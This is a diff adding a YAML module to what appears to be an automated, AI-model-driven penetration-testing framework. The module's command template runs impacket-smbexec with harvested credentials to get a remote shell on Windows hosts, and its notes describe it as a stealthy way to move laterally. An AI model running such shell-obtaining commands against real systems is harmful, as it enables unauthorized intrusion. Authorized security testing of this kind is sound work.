@@ -1,0 +1,22 @@
+name: smbexec
+category: shell
+description: Semi-interactive shell via SMB service creation
+preconditions:
+  - service.port==445
+  - has_cred
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: "impacket-smbexec '{domain}/{username}:{password}@{target_ip}'"
+parser: null
+expected_effects:
+  - shell_obtained
+  - phase_advance
+falsifier:
+  pattern: "ACCESS_DENIED|Connection refused"
+  timeout: 30
+model_tier: haiku
+mechanism: "Creates a Windows service that writes command output to a temp file, reads it back via SMB. Stealthier than psexec (no binary upload). Requires admin rights on target."
